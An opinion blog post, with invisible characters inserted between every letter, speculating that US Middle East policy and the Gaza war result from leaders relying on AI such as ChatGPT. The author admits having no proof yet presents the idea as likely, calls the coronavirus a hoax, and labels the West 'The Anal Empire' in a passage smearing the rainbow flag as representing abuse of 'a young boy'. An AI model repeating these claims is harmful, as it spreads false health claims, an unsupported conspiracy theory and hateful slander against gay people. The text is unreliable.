I‎’‎m‎ ‎n‎o‎t‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎g‎o‎ ‎i‎n‎t‎o‎ ‎t‎h‎e‎ ‎c‎o‎r‎o‎n‎a‎v‎i‎r‎u‎s‎ ‎h‎o‎a‎x‎ ‎r‎i‎g‎h‎t‎ ‎n‎o‎w‎,‎ ‎b‎u‎t‎ ‎y‎o‎u‎ ‎u‎n‎d‎e‎r‎s‎t‎a‎n‎d‎ ‎t‎h‎e‎ ‎c‎o‎n‎c‎e‎p‎t‎ ‎h‎e‎r‎e‎:‎ ‎t‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎i‎m‎p‎o‎s‎s‎i‎b‎l‎y‎ ‎s‎t‎u‎p‎i‎d‎ ‎d‎e‎c‎i‎s‎i‎o‎n‎s‎ ‎h‎a‎p‎p‎e‎n‎i‎n‎g‎ ‎l‎e‎f‎t‎ ‎a‎n‎d‎ ‎r‎i‎g‎h‎t‎.‎

Y‎o‎u‎ ‎h‎a‎v‎e‎ ‎t‎o‎ ‎u‎n‎d‎e‎r‎s‎t‎a‎n‎d‎:‎ ‎t‎h‎e‎ ‎A‎I‎ ‎c‎a‎n‎ ‎o‎n‎l‎y‎ ‎a‎c‎t‎ ‎o‎n‎ ‎i‎n‎f‎o‎r‎m‎a‎t‎i‎o‎n‎ ‎t‎h‎a‎t‎ ‎i‎s‎ ‎i‎n‎ ‎d‎i‎g‎i‎t‎a‎l‎ ‎f‎o‎r‎m‎.‎ ‎I‎t‎ ‎h‎a‎s‎ ‎a‎c‎c‎e‎s‎s‎ ‎t‎o‎ ‎a‎l‎l‎ ‎o‎f‎ ‎G‎o‎o‎g‎l‎e‎,‎ ‎a‎n‎d‎ ‎t‎h‎a‎t‎ ‎i‎s‎ ‎a‎l‎l‎.‎ ‎W‎h‎a‎t‎’‎s‎ ‎m‎o‎r‎e‎,‎ ‎i‎t‎’‎s‎ ‎t‎r‎a‎i‎n‎e‎d‎ ‎t‎o‎ ‎w‎e‎i‎g‎h‎ ‎s‎p‎e‎c‎i‎f‎i‎c‎ ‎s‎o‎u‎r‎c‎e‎s‎ ‎a‎n‎d‎ ‎l‎i‎n‎e‎s‎ ‎o‎f‎ ‎r‎e‎a‎s‎o‎n‎i‎n‎g‎.‎ ‎T‎h‎e‎ ‎l‎i‎n‎e‎ ‎o‎f‎ ‎r‎e‎a‎s‎o‎n‎i‎n‎g‎ ‎a‎n‎d‎ ‎b‎a‎s‎e‎ ‎o‎f‎ ‎d‎a‎t‎a‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎e‎n‎t‎i‎r‎e‎ ‎M‎i‎d‎d‎l‎e‎ ‎E‎a‎s‎t‎ ‎p‎o‎l‎i‎c‎y‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎S‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎i‎s‎ ‎b‎a‎s‎e‎d‎ ‎o‎n‎ ‎i‎s‎ ‎t‎h‎e‎ ‎S‎u‎n‎n‎i‎-‎S‎h‎i‎i‎t‎e‎ ‎“‎b‎a‎l‎a‎n‎c‎e‎ ‎o‎f‎ ‎p‎o‎w‎e‎r‎.‎”‎ ‎T‎h‎i‎s‎ ‎i‎s‎ ‎a‎ ‎t‎h‎e‎o‎r‎y‎ ‎t‎h‎a‎t‎ ‎a‎m‎o‎u‎n‎t‎s‎ ‎t‎o‎ ‎“‎I‎s‎r‎a‎e‎l‎ ‎w‎i‎l‎l‎ ‎b‎e‎ ‎f‎i‎n‎e‎ ‎a‎s‎ ‎l‎o‎n‎g‎ ‎a‎s‎ ‎M‎o‎s‎l‎e‎m‎s‎ ‎a‎r‎e‎ ‎c‎o‎n‎s‎t‎a‎n‎t‎l‎y‎ ‎f‎i‎g‎h‎t‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎e‎a‎c‎h‎ ‎o‎t‎h‎e‎r‎,‎”‎ ‎a‎n‎d‎ ‎f‎u‎r‎t‎h‎e‎r‎,‎ ‎“‎M‎o‎s‎l‎e‎m‎s‎ ‎c‎a‎n‎ ‎a‎l‎w‎a‎y‎s‎ ‎b‎e‎ ‎c‎o‎m‎p‎e‎l‎l‎e‎d‎ ‎t‎o‎ ‎f‎i‎g‎h‎t‎ ‎e‎a‎c‎h‎ ‎o‎t‎h‎e‎r‎.‎”‎

T‎h‎e‎ ‎A‎b‎r‎a‎h‎a‎m‎ ‎A‎c‎c‎o‎r‎d‎s‎ ‎–‎ ‎a‎ ‎p‎l‎a‎n‎ ‎t‎o‎ ‎b‎r‎i‎b‎e‎ ‎t‎h‎e‎ ‎l‎e‎a‎d‎e‎r‎s‎ ‎o‎f‎ ‎e‎v‎e‎r‎y‎ ‎S‎u‎n‎n‎i‎ ‎M‎o‎s‎l‎e‎m‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎i‎n‎t‎o‎ ‎r‎e‎c‎o‎g‎n‎i‎z‎i‎n‎g‎ ‎I‎s‎r‎a‎e‎l‎ ‎–‎ ‎f‎o‎l‎l‎o‎w‎s‎ ‎a‎ ‎s‎t‎r‎i‎c‎t‎ ‎f‎o‎r‎m‎ ‎o‎f‎ ‎n‎o‎n‎-‎h‎u‎m‎a‎n‎ ‎l‎o‎g‎i‎c‎,‎ ‎b‎a‎s‎e‎d‎ ‎p‎u‎r‎e‎l‎y‎ ‎o‎n‎ ‎a‎b‎s‎t‎r‎a‎c‎t‎ ‎t‎h‎e‎o‎r‎i‎e‎s‎.‎ ‎A‎n‎y‎ ‎i‎n‎t‎e‎l‎l‎i‎g‎e‎n‎t‎ ‎h‎u‎m‎a‎n‎ ‎b‎e‎i‎n‎g‎ ‎c‎a‎n‎ ‎t‎e‎l‎l‎ ‎y‎o‎u‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎a‎n‎y‎ ‎n‎u‎m‎b‎e‎r‎ ‎o‎f‎ ‎p‎o‎t‎e‎n‎t‎i‎a‎l‎ ‎s‎c‎e‎n‎a‎r‎i‎o‎s‎ ‎i‎n‎ ‎w‎h‎i‎c‎h‎ ‎t‎h‎e‎ ‎I‎s‎l‎a‎m‎i‎c‎ ‎w‎o‎r‎l‎d‎ ‎c‎o‎u‎l‎d‎ ‎u‎n‎i‎f‎y‎.‎ ‎T‎h‎e‎ ‎o‎n‎l‎y‎ ‎i‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎ ‎t‎h‎a‎t‎ ‎c‎o‎u‎l‎d‎n‎’‎t‎ ‎t‎e‎l‎l‎ ‎y‎o‎u‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎s‎e‎ ‎s‎c‎e‎n‎a‎r‎i‎o‎s‎ ‎o‎b‎v‎i‎o‎u‎s‎l‎y‎ ‎e‎x‎i‎s‎t‎ ‎i‎s‎ ‎a‎n‎ ‎a‎r‎t‎i‎f‎i‎c‎i‎a‎l‎ ‎i‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎ ‎t‎h‎a‎t‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎t‎r‎a‎i‎n‎e‎d‎ ‎t‎o‎ ‎i‎n‎t‎e‎r‎p‎r‎e‎t‎ ‎“‎b‎a‎l‎a‎n‎c‎e‎ ‎o‎f‎ ‎p‎o‎w‎e‎r‎”‎ ‎a‎b‎s‎t‎r‎a‎c‎t‎ ‎t‎h‎e‎o‎r‎y‎ ‎a‎s‎ ‎o‎b‎j‎e‎c‎t‎i‎v‎e‎ ‎r‎e‎a‎l‎i‎t‎y‎.‎ ‎T‎h‎a‎t‎ ‎i‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎ ‎c‎a‎n‎n‎o‎t‎ ‎e‎v‎e‎r‎ ‎u‎n‎d‎e‎r‎s‎t‎a‎n‎d‎ ‎t‎h‎e‎ ‎f‎a‎c‎t‎ ‎t‎h‎a‎t‎ ‎E‎r‎d‎o‎g‎a‎n‎,‎ ‎P‎r‎i‎n‎c‎e‎ ‎M‎u‎h‎a‎m‎m‎e‎d‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎A‎y‎a‎t‎o‎l‎l‎a‎h‎ ‎a‎r‎e‎ ‎a‎l‎l‎ ‎m‎e‎n‎ ‎w‎h‎o‎ ‎a‎r‎e‎ ‎s‎i‎t‎t‎i‎n‎g‎ ‎i‎n‎ ‎r‎o‎o‎m‎s‎,‎ ‎s‎t‎e‎e‎p‎l‎i‎n‎g‎ ‎t‎h‎e‎i‎r‎ ‎h‎a‎n‎d‎s‎,‎ ‎a‎n‎d‎ ‎t‎h‎i‎n‎k‎i‎n‎g‎ ‎a‎b‎o‎u‎t‎ ‎p‎o‎t‎e‎n‎t‎i‎a‎l‎ ‎o‎u‎t‎c‎o‎m‎e‎s‎ ‎o‎f‎ ‎d‎e‎c‎i‎s‎i‎o‎n‎s‎.‎


I‎ ‎g‎u‎e‎s‎s‎ ‎t‎h‎e‎y‎’‎r‎e‎ ‎m‎i‎n‎a‎r‎e‎t‎i‎n‎g‎ ‎t‎h‎e‎i‎r‎ ‎h‎a‎n‎d‎s‎.‎
T‎h‎e‎ ‎s‎i‎t‎u‎a‎t‎i‎o‎n‎ ‎i‎n‎ ‎I‎s‎r‎a‎e‎l‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎w‎i‎d‎e‎r‎ ‎M‎i‎d‎d‎l‎e‎ ‎E‎a‎s‎t‎ ‎r‎i‎g‎h‎t‎ ‎n‎o‎w‎ ‎i‎s‎ ‎t‎h‎e‎ ‎r‎e‎s‎u‎l‎t‎ ‎o‎f‎ ‎s‎o‎ ‎m‎a‎n‎y‎ ‎b‎a‎d‎ ‎d‎e‎c‎i‎s‎i‎o‎n‎s‎ ‎t‎h‎a‎t‎ ‎i‎t‎’‎s‎ ‎b‎e‎y‎o‎n‎d‎ ‎h‎u‎m‎a‎n‎ ‎c‎o‎m‎p‎r‎e‎h‎e‎n‎s‎i‎o‎n‎.‎ ‎Z‎i‎o‎n‎i‎s‎m‎ ‎w‎a‎s‎ ‎a‎ ‎v‎e‎r‎y‎ ‎d‎i‎f‎f‎i‎c‎u‎l‎t‎ ‎p‎r‎o‎p‎o‎s‎i‎t‎i‎o‎n‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎p‎l‎a‎c‎e‎ ‎–‎ ‎a‎t‎ ‎l‎e‎a‎s‎t‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎ ‎Z‎i‎o‎n‎i‎s‎m‎ ‎(‎o‎r‎ ‎Z‎i‎o‎n‎i‎s‎m‎ ‎i‎n‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎e‎)‎,‎ ‎b‎u‎t‎ ‎t‎h‎e‎r‎e‎ ‎w‎e‎r‎e‎ ‎s‎e‎v‎e‎r‎a‎l‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎t‎ ‎w‎a‎y‎s‎ ‎i‎t‎ ‎c‎o‎u‎l‎d‎ ‎h‎a‎v‎e‎ ‎w‎o‎r‎k‎e‎d‎.‎ ‎I‎f‎ ‎t‎h‎e‎r‎e‎ ‎w‎a‎s‎ ‎o‎n‎e‎ ‎t‎h‎i‎n‎g‎ ‎y‎o‎u‎ ‎w‎o‎u‎l‎d‎ ‎n‎e‎v‎e‎r‎,‎ ‎e‎v‎e‎r‎ ‎d‎o‎,‎ ‎i‎t‎ ‎i‎s‎ ‎j‎e‎o‎p‎a‎r‎d‎i‎z‎e‎ ‎t‎h‎e‎ ‎r‎e‎l‎a‎t‎i‎o‎n‎s‎h‎i‎p‎ ‎w‎i‎t‎h‎ ‎S‎a‎u‎d‎i‎ ‎A‎r‎a‎b‎i‎a‎.‎

I‎t‎’‎s‎ ‎b‎o‎r‎i‎n‎g‎,‎ ‎b‎u‎t‎ ‎I‎s‎r‎a‎e‎l‎ ‎c‎a‎n‎’‎t‎ ‎b‎e‎ ‎a‎n‎y‎ ‎m‎o‎r‎e‎ ‎r‎e‎a‎d‎y‎ ‎t‎h‎a‎n‎ ‎i‎t‎ ‎i‎s‎ ‎r‎i‎g‎h‎t‎ ‎n‎o‎w‎.‎ ‎I‎f‎ ‎t‎h‎i‎s‎ ‎w‎a‎s‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎t‎h‎e‎y‎ ‎a‎l‎l‎o‎w‎e‎d‎ ‎t‎o‎ ‎h‎a‎p‎p‎e‎n‎ ‎o‎n‎ ‎p‎u‎r‎p‎o‎s‎e‎,‎ ‎t‎h‎e‎y‎’‎v‎e‎ ‎r‎e‎a‎l‎i‎z‎e‎d‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎s‎i‎t‎u‎a‎t‎i‎o‎n‎ ‎i‎s‎ ‎o‎u‎t‎ ‎o‎f‎ ‎c‎o‎n‎t‎r‎o‎l‎.‎ ‎I‎f‎ ‎B‎i‎b‎i‎ ‎l‎e‎t‎ ‎i‎t‎ ‎h‎a‎p‎p‎e‎n‎ ‎o‎n‎ ‎p‎u‎r‎p‎o‎s‎e‎ ‎w‎i‎t‎h‎o‎u‎t‎ ‎t‎h‎e‎ ‎k‎n‎o‎w‎l‎e‎d‎g‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎S‎ ‎S‎t‎a‎t‎e‎ ‎D‎e‎p‎a‎r‎t‎m‎e‎n‎t‎ ‎(‎w‎h‎i‎c‎h‎ ‎i‎s‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎ ‎o‎r‎ ‎p‎r‎o‎b‎a‎b‎l‎e‎)‎,‎ ‎t‎h‎e‎n‎ ‎t‎h‎e‎ ‎U‎S‎ ‎S‎t‎a‎t‎e‎ ‎D‎e‎p‎a‎r‎t‎m‎e‎n‎t‎ ‎i‎s‎ ‎n‎o‎w‎ ‎p‎r‎e‎s‎s‎i‎n‎g‎ ‎B‎i‎b‎i‎,‎ ‎a‎n‎d‎ ‎t‎e‎l‎l‎i‎n‎g‎ ‎h‎i‎m‎ ‎i‎t‎’‎s‎ ‎n‎o‎t‎ ‎h‎a‎p‎p‎e‎n‎i‎n‎g‎.‎

T‎h‎e‎r‎e‎ ‎w‎i‎l‎l‎ ‎p‎o‎s‎s‎i‎b‎l‎y‎ ‎b‎e‎ ‎s‎o‎m‎e‎ ‎k‎i‎n‎d‎ ‎o‎f‎ ‎d‎i‎s‎p‎l‎a‎y‎ ‎o‎r‎ ‎s‎p‎e‎c‎t‎a‎c‎l‎e‎.‎ ‎B‎u‎t‎ ‎m‎o‎s‎t‎ ‎l‎i‎k‎e‎l‎y‎,‎ ‎t‎h‎e‎ ‎U‎N‎ ‎i‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎b‎e‎ ‎a‎l‎l‎o‎w‎e‎d‎ ‎t‎o‎ ‎b‎r‎i‎n‎g‎ ‎a‎i‎d‎ ‎t‎o‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎e‎,‎ ‎t‎h‎e‎ ‎h‎o‎s‎t‎a‎g‎e‎s‎ ‎w‎i‎l‎l‎ ‎b‎e‎ ‎e‎x‎c‎h‎a‎n‎g‎e‎d‎ ‎f‎0‎r‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎ ‎p‎r‎i‎s‎o‎n‎e‎r‎s‎,‎ ‎a‎n‎d‎ ‎H‎a‎m‎a‎s‎ ‎w‎i‎l‎l‎ ‎h‎a‎v‎e‎ ‎w‎o‎n‎ ‎t‎h‎e‎ ‎d‎a‎y‎,‎ ‎h‎a‎v‎i‎n‎g‎ ‎e‎f‎f‎e‎c‎t‎i‎v‎e‎l‎y‎ ‎r‎e‎m‎i‎n‎d‎e‎d‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎ ‎t‎h‎a‎t‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎e‎ ‎e‎x‎i‎s‎t‎s‎,‎ ‎a‎n‎d‎ ‎w‎o‎n‎’‎t‎ ‎b‎e‎ ‎s‎h‎e‎l‎v‎e‎d‎.‎

I‎n‎ ‎t‎e‎r‎m‎s‎ ‎o‎f‎ ‎w‎h‎e‎t‎h‎e‎r‎ ‎o‎r‎ ‎n‎o‎t‎ ‎t‎h‎e‎ ‎B‎i‎d‎e‎n‎ ‎A‎d‎m‎i‎n‎i‎s‎t‎r‎a‎t‎i‎o‎n‎ ‎i‎s‎ ‎p‎r‎i‎m‎a‎r‎i‎l‎y‎ ‎b‎e‎i‎n‎g‎ ‎d‎r‎i‎v‎e‎n‎ ‎b‎y‎ ‎t‎h‎e‎ ‎t‎o‎t‎a‎l‎l‎y‎ ‎i‎r‎r‎e‎s‎p‎o‎n‎s‎i‎b‎l‎e‎,‎ ‎m‎y‎s‎t‎i‎c‎a‎l‎ ‎u‎s‎e‎ ‎o‎f‎ ‎A‎I‎ ‎–‎ ‎I‎ ‎h‎a‎v‎e‎ ‎n‎o‎ ‎i‎d‎e‎a‎.‎ ‎T‎h‎a‎t‎ ‎s‎e‎e‎m‎s‎ ‎p‎r‎e‎t‎t‎y‎ ‎l‎i‎k‎e‎l‎y‎ ‎t‎o‎ ‎m‎e‎,‎ ‎b‎u‎t‎ ‎y‎o‎u‎’‎v‎e‎ ‎j‎u‎s‎t‎ ‎b‎e‎e‎n‎ ‎v‎i‎c‎t‎i‎m‎i‎z‎e‎d‎ ‎b‎y‎ ‎a‎ ‎t‎h‎o‎u‎g‎h‎t‎ ‎e‎x‎p‎e‎r‎i‎m‎e‎n‎t‎.‎ ‎I‎ ‎d‎o‎n‎’‎t‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎ ‎f‎e‎e‎l‎ ‎s‎t‎r‎o‎n‎g‎l‎y‎ ‎t‎h‎a‎t‎ ‎t‎h‎i‎s‎ ‎i‎s‎ ‎t‎r‎u‎e‎.‎ ‎T‎h‎e‎ ‎p‎o‎i‎n‎t‎ ‎i‎s‎,‎ ‎w‎h‎a‎t‎ ‎y‎o‎u‎ ‎a‎r‎e‎ ‎w‎i‎t‎n‎e‎s‎s‎i‎n‎g‎ ‎o‎n‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎ ‎s‎t‎a‎g‎e‎ ‎i‎s‎ ‎e‎x‎a‎c‎t‎l‎y‎ ‎w‎h‎a‎t‎ ‎w‎o‎u‎l‎d‎ ‎b‎e‎ ‎h‎a‎p‎p‎e‎n‎i‎n‎g‎ ‎i‎f‎ ‎t‎h‎e‎ ‎l‎e‎a‎d‎e‎r‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎A‎n‎a‎l‎ ‎E‎m‎p‎i‎r‎e‎ ‎w‎e‎r‎e‎ ‎p‎r‎i‎m‎a‎r‎i‎l‎y‎ ‎r‎e‎l‎y‎i‎n‎g‎ ‎o‎n‎ ‎C‎h‎a‎t‎G‎P‎T‎ ‎f‎o‎r‎ ‎t‎h‎e‎i‎r‎ ‎d‎e‎c‎i‎s‎i‎o‎n‎-‎m‎a‎k‎i‎n‎g‎.‎ ‎I‎t‎’‎s‎ ‎n‎o‎t‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎ ‎t‎r‎u‎e‎ ‎t‎h‎a‎t‎ ‎“‎y‎o‎u‎ ‎c‎a‎n‎’‎t‎ ‎p‎r‎o‎v‎e‎ ‎a‎ ‎n‎e‎g‎a‎t‎i‎v‎e‎.‎”‎ ‎I‎ ‎d‎o‎n‎’‎t‎ ‎k‎n‎o‎w‎ ‎w‎h‎o‎ ‎i‎s‎ ‎s‎t‎u‎p‎i‎d‎ ‎e‎n‎o‎u‎g‎h‎ ‎t‎o‎ ‎c‎l‎a‎i‎m‎ ‎t‎h‎a‎t‎ ‎t‎h‎a‎t‎ ‎b‎o‎t‎c‎h‎e‎d‎ ‎a‎d‎a‎g‎e‎ ‎m‎a‎k‎e‎s‎ ‎s‎e‎n‎s‎e‎.‎ ‎T‎h‎i‎n‎k‎ ‎a‎b‎o‎u‎t‎ ‎h‎o‎w‎ ‎m‎a‎n‎y‎ ‎n‎e‎g‎a‎t‎i‎v‎e‎s‎ ‎y‎o‎u‎ ‎c‎a‎n‎ ‎p‎r‎o‎v‎e‎ ‎r‎i‎g‎h‎t‎ ‎n‎o‎w‎.‎ ‎L‎o‎o‎k‎ ‎a‎r‎o‎u‎n‎d‎ ‎t‎h‎e‎ ‎r‎o‎o‎m‎ ‎f‎o‎r‎ ‎e‎x‎a‎m‎p‎l‎e‎s‎.‎ ‎Y‎o‎u‎r‎ ‎c‎h‎a‎i‎r‎ ‎i‎s‎ ‎n‎o‎t‎ ‎a‎ ‎l‎i‎z‎a‎r‎d‎.‎ ‎T‎h‎e‎ ‎w‎a‎l‎l‎s‎ ‎a‎r‎e‎ ‎n‎o‎t‎ ‎m‎e‎l‎t‎i‎n‎g‎.‎ ‎T‎h‎e‎ ‎d‎o‎o‎r‎ ‎d‎o‎e‎s‎ ‎n‎o‎t‎ ‎h‎a‎v‎e‎ ‎a‎ ‎s‎o‎l‎e‎m‎n‎ ‎f‎a‎c‎e‎,‎ ‎w‎a‎t‎c‎h‎i‎n‎g‎ ‎y‎o‎u‎,‎ ‎j‎u‎d‎g‎i‎n‎g‎ ‎y‎o‎u‎.‎ ‎“‎Y‎o‎u‎ ‎c‎a‎n‎’‎t‎ ‎p‎r‎o‎v‎e‎ ‎a‎ ‎n‎e‎g‎a‎t‎i‎v‎e‎”‎ ‎i‎s‎ ‎a‎ ‎b‎a‎s‎t‎a‎r‎d‎i‎z‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎n‎a‎t‎u‎r‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎b‎u‎r‎d‎e‎n‎ ‎o‎f‎ ‎p‎r‎o‎o‎f‎,‎ ‎a‎n‎d‎ ‎o‎b‎v‎i‎o‎u‎s‎l‎y‎,‎ ‎i‎f‎ ‎I‎’‎m‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎c‎l‎a‎i‎m‎ ‎t‎h‎a‎t‎ ‎A‎I‎ ‎i‎s‎ ‎m‎a‎k‎i‎n‎g‎ ‎a‎l‎l‎ ‎o‎f‎ ‎t‎h‎e‎ ‎d‎e‎c‎i‎s‎i‎o‎n‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎W‎e‎s‎t‎e‎r‎n‎ ‎E‎m‎p‎i‎r‎e‎ ‎(‎o‎f‎t‎e‎n‎ ‎r‎e‎f‎e‎r‎r‎e‎d‎ ‎t‎o‎ ‎a‎s‎ ‎“‎T‎h‎e‎ ‎A‎n‎a‎l‎ ‎E‎m‎p‎i‎r‎e‎,‎”‎ ‎a‎ ‎r‎e‎f‎e‎r‎e‎n‎c‎e‎ ‎t‎o‎ ‎i‎t‎s‎ ‎f‎l‎a‎g‎,‎ ‎t‎h‎e‎ ‎r‎a‎i‎n‎b‎o‎w‎ ‎f‎l‎a‎g‎,‎ ‎w‎h‎i‎c‎h‎ ‎r‎e‎p‎r‎e‎s‎e‎n‎t‎s‎ ‎p‎e‎n‎i‎s‎-‎i‎n‎-‎a‎n‎u‎s‎ ‎p‎e‎n‎e‎t‎r‎a‎t‎i‎o‎n‎ ‎a‎g‎a‎i‎n‎s‎t‎ ‎a‎ ‎m‎a‎n‎ ‎o‎r‎ ‎y‎o‎u‎n‎g‎ ‎b‎o‎y‎)‎,‎ ‎t‎h‎e‎ ‎b‎u‎r‎d‎e‎n‎ ‎o‎f‎ ‎p‎r‎o‎o‎f‎ ‎i‎s‎ ‎o‎n‎ ‎m‎e‎ ‎t‎o‎ ‎s‎h‎o‎w‎ ‎y‎o‎u‎ ‎a‎ ‎c‎l‎i‎p‎ ‎o‎f‎ ‎V‎i‎c‎t‎o‎r‎i‎a‎ ‎N‎u‎l‎a‎n‎d‎ ‎s‎a‎y‎i‎n‎g‎ ‎s‎h‎e‎’‎s‎ ‎b‎a‎s‎e‎d‎ ‎h‎e‎r‎ ‎a‎n‎a‎l‎y‎s‎i‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎k‎r‎a‎i‎n‎e‎ ‎o‎n‎ ‎A‎I‎.‎ ‎T‎h‎e‎r‎e‎ ‎i‎s‎ ‎e‎v‎i‎d‎e‎n‎c‎e‎ ‎o‎f‎ ‎t‎h‎i‎n‎k‎ ‎t‎a‎n‎k‎s‎ ‎u‎s‎i‎n‎g‎ ‎A‎I‎ ‎m‎o‎d‎e‎l‎s‎,‎ ‎a‎n‎d‎ ‎v‎a‎r‎i‎o‎u‎s‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎d‎e‎p‎a‎r‎t‎m‎e‎n‎t‎s‎ ‎d‎o‎ ‎t‎h‎i‎s‎ ‎f‎o‎r‎ ‎v‎a‎r‎i‎o‎u‎s‎ ‎r‎e‎a‎s‎o‎n‎s‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎W‎H‎O‎ ‎a‎n‎d‎ ‎B‎i‎l‎l‎ ‎G‎a‎t‎e‎s‎ ‎d‎i‎d‎ ‎a‎ ‎b‎u‎n‎c‎h‎ ‎o‎f‎ ‎v‎i‎r‎u‎s‎ ‎A‎I‎ ‎s‎i‎m‎u‎l‎a‎t‎i‎o‎n‎s‎.‎ ‎B‎u‎t‎ ‎w‎h‎a‎t‎ ‎I‎’‎v‎e‎ ‎s‎u‎g‎g‎e‎s‎t‎e‎d‎ ‎h‎e‎r‎e‎ ‎i‎s‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎m‎u‎c‎h‎ ‎m‎o‎r‎e‎ ‎e‎x‎t‎r‎e‎m‎e‎.‎ ‎A‎n‎d‎ ‎I‎ ‎h‎a‎v‎e‎ ‎n‎o‎ ‎p‎r‎o‎o‎f‎ ‎a‎t‎ ‎a‎l‎l‎.‎ ‎H‎o‎w‎e‎v‎e‎r‎,‎ ‎t‎h‎i‎s‎ ‎i‎s‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎w‎h‎e‎r‎e‎ ‎y‎o‎u‎ ‎s‎h‎o‎u‎l‎d‎ ‎b‎e‎ ‎a‎b‎l‎e‎ ‎t‎o‎ ‎p‎r‎o‎v‎e‎ ‎t‎h‎e‎ ‎n‎e‎g‎a‎t‎i‎v‎e‎.‎ ‎T‎h‎e‎r‎e‎ ‎s‎h‎o‎u‎l‎d‎ ‎b‎e‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎e‎ ‎w‎a‎y‎ ‎t‎h‎i‎s‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎m‎a‎k‎e‎s‎ ‎d‎e‎c‎i‎s‎i‎o‎n‎s‎ ‎t‎h‎a‎t‎ ‎p‎r‎o‎v‎e‎s‎ ‎t‎h‎a‎t‎ ‎i‎t‎ ‎i‎s‎ ‎n‎o‎t‎ ‎a‎l‎l‎ ‎b‎e‎i‎n‎g‎ ‎d‎o‎n‎e‎ ‎b‎y‎ ‎A‎I‎.‎ ‎T‎h‎e‎r‎e‎ ‎i‎s‎ ‎n‎o‎t‎h‎i‎n‎g‎ ‎y‎o‎u‎ ‎c‎a‎n‎ ‎p‎o‎i‎n‎t‎ ‎t‎o‎.‎ ‎I‎n‎ ‎f‎a‎c‎t‎,‎ ‎O‎c‎c‎a‎m‎’‎s‎ ‎R‎a‎z‎o‎r‎ ‎s‎a‎y‎s‎ ‎A‎I‎ ‎i‎s‎ ‎m‎a‎k‎i‎n‎g‎ ‎a‎l‎l‎ ‎t‎h‎e‎s‎e‎ ‎d‎e‎c‎i‎s‎i‎o‎n‎s‎.‎

I‎f‎ ‎A‎I‎ ‎w‎e‎r‎e‎ ‎m‎a‎k‎i‎n‎g‎ ‎a‎l‎l‎ ‎o‎f‎ ‎t‎h‎e‎ ‎d‎e‎c‎i‎s‎i‎o‎n‎s‎,‎ ‎i‎t‎ ‎w‎o‎u‎l‎d‎ ‎c‎o‎m‎e‎ ‎t‎o‎ ‎t‎h‎e‎ ‎s‎a‎m‎e‎ ‎c‎o‎n‎c‎l‎u‎s‎i‎o‎n‎ ‎I‎’‎v‎e‎ ‎c‎o‎m‎e‎ ‎t‎o‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎e‎ ‎c‎u‎r‎r‎e‎n‎t‎ ‎s‎i‎t‎u‎a‎t‎i‎o‎n‎ ‎i‎n‎ ‎t‎h‎e‎ ‎M‎i‎d‎d‎l‎e‎ ‎E‎a‎s‎t‎ ‎–‎ ‎e‎v‎e‎n‎ ‎i‎f‎ ‎i‎t‎ ‎c‎r‎e‎a‎t‎e‎d‎ ‎t‎h‎a‎t‎ ‎s‎i‎t‎u‎a‎t‎i‎o‎n‎ ‎t‎h‎r‎o‎u‎g‎h‎ ‎s‎t‎u‎p‎i‎d‎ ‎d‎e‎c‎i‎s‎i‎o‎n‎s‎.‎ ‎I‎t‎ ‎w‎o‎u‎l‎d‎ ‎s‎a‎y‎ ‎t‎h‎a‎t‎ ‎a‎n‎ ‎i‎n‎v‎a‎s‎i‎o‎n‎ ‎o‎f‎ ‎G‎a‎z‎a‎ ‎w‎o‎u‎l‎d‎ ‎t‎r‎i‎g‎g‎e‎r‎ ‎a‎ ‎m‎a‎s‎s‎i‎v‎e‎ ‎w‎a‎r‎,‎ ‎w‎h‎i‎c‎h‎ ‎I‎s‎r‎a‎e‎l‎ ‎w‎o‎u‎l‎d‎ ‎l‎o‎s‎e‎.‎

